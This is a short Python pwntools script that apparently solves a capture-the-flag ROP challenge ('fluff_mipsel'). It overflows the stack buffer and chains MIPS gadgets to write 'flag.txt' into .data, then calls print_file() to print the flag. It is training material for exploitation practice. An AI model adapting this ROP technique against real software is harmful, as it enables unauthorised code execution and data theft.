#/usr/bin/python3
from pwn import process, p32, log

shell = process("./fluff_mipsel")

offset = 36
junk = b"A" * offset

string = b"flag.txt"

payload  = b""
payload += junk

for i in range(0, len(string), 4):
    payload += p32(0x400aac)     # lw $ra, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x28;
    payload += p32(0x0) * 7      # padding
    payload += p32(0x411000 + i) # .data
    payload += string[i:i+4]     # string
    payload += p32(0x40099c)     # lw $t9, 4($sp); sw $s1, ($s0); jalr $t9; addi $sp, $sp, 8;
    payload += p32(0x0)          # padding

payload += p32(0x4009ac) # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; addi $sp, $sp, 0xc;
payload += p32(0x0)      # padding
payload += p32(0x400af0) # print_file()
payload += p32(0x411000) # .data

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
